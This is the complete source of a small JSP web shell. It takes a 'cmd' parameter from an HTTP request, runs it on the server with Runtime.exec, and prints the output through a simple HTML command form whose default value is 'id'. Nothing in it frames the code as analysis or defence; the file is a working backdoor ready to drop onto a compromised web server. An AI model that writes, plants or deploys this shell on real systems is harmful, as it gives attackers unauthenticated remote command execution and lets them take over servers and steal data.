<%@ page import="java.util.*,java.io.*"%>
<%
// Simple JSP WebShell
if(request.getParameter("cmd") != null) {
    Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
    BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
    String line;
    while ((line = br.readLine()) != null) {
        out.println(line);
    }
}
%>
<html>
<body>
<form method="get">
Command: <input type="text" name="cmd" size="50" value="<%= request.getParameter("cmd") != null ? request.getParameter("cmd") : "id" %>">
<input type="submit" value="Execute">
</form>
</body>
</html>
